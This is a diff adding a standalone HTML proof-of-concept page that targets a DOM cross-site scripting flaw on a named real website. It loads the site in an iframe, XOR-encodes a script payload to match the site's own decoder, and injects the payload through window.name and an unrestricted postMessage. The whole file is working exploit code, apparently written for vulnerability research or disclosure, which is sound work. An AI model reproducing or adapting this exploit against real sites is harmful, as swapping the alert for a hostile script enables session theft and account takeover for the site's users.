@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>💥 TheBrowser XSS Chain Exploit</title>
+  <meta charset="utf-8">
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 1em; }
+    iframe { width: 100%; height: 600px; border: 2px solid #0f0; margin-top: 1em; }
+  </style>
+</head>
+<body>
+
+<h2>✅ PoC: DOM XSS via window.name + postMessage</h2>
+<div id="status">🔄 Waiting for iframe to load...</div>
+
+<iframe id="target" src="https://thebrowser.company/" sandbox="allow-scripts allow-same-origin"></iframe>
+
+<script>
+  const payload = '<script>alert(document.domain)</script>';
+
+  // XOR encoding function based on site's decoder
+  function xorEncode(str, key = 0x66) {
+    const hex = str.split('').map(c => {
+      const code = c.charCodeAt(0) ^ key;
+      return code.toString(16).padStart(2, '0');
+    });
+    return key.toString(16).padStart(2, '0') + hex.join('');
+  }
+
+  const encoded = xorEncode(payload);
+
+  // Set window.name
+  const iframe = document.getElementById("target");
+  iframe.onload = () => {
+    document.getElementById("status").textContent = "✅ iframe loaded";
+
+    // Send encoded payload via window.name
+    iframe.contentWindow.name = encoded;
+
+    // Also send via postMessage
+    setTimeout(() => {
+      iframe.contentWindow.postMessage(encoded, "*");
+      console.log("🚀 Payload sent via postMessage + window.name");
+    }, 1000);
+  };
+</script>
+
+</body>
+</html>
